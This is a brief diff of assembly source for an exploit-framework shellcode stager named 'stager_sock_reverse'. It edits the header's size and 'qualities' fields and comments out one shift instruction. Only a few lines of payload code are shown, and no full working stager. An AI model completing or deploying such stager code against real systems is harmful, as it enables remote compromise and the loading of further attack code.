@@ -1,8 +1,8 @@
 ;;
 ; 
 ;        Name: stager_sock_reverse
-;        Size: 50 bytes
-;   Qualities: Can Have Nulls
+;        Size: 36 bytes
+;   Qualities: Nothing Special
 ;     Authors: skape <mmiller [at] hick.org>
 ;     Version: $Revision$
 ;     License: 
@@ -31,7 +31,7 @@ initialize_stack:
 	push esi
 	push ebx
 	mov  ecx, esp
-	shr  ebx, 0x8
+;	shr  ebx, 0x8
 	xchg bh, bl
 
 findtag:
